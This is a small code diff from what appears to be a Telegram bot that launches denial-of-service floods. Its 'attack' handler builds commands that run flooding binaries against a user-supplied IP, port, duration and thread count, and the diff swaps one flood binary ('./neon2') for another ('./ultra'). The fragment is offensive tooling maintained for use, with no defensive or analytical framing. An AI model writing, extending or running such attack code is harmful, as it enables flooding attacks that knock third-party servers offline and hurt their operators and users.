@@ -674,7 +674,7 @@ async def attack(update: Update, context: CallbackContext):
     if argument_type == 3:
         attack_command = f"./and {ip} {port} {duration} "
     elif argument_type == 4:
-        attack_command = f"./neon2 {ip} {port} {duration} {threads} 20 500"
+        attack_command = f"./ultra {ip} {port} {duration} {threads} 20 500"
     elif argument_type == 5:
         attack_command = f"./neonhrj {ip} {port} {duration} {byte_size} {threads} 20"
 
